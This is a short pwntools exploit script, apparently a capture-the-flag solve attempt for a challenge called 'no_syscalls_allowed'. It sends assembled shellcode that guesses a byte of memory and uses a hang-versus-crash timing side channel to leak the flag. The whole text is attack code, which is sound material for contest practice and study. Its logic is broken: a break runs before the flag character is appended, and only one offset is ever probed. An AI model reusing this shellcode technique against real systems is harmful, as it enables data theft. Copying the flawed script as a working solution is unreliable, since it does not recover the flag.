from pwn import *

elf = ELF("no_syscalls_allowed")
context.arch = "amd64"



#
raw_input("DEBUG")
flag = ""

for i in range(0,0xff):
	try:
		print("i = ", chr(i))
		p = elf.process()
		#p = remote("no-syscalls-allowed.chal.uiuc.tf", 1337)
		
		payload = asm(f"""
			mov r14,[rsp]
			and r14, 0xfffffffffffff000
			add r14, 0x3080
			mov r15b, BYTE PTR [r14]
			xor r15b, {i}
			cmp r15b, 0
			je loop
			syscall
			
			loop:
			jmp loop
		""")

		p.sendline(payload)
		p.recvline(timeout = 5)
		break
		flag += chr(i)
				
	except:
		print("DEO PHAI")
	


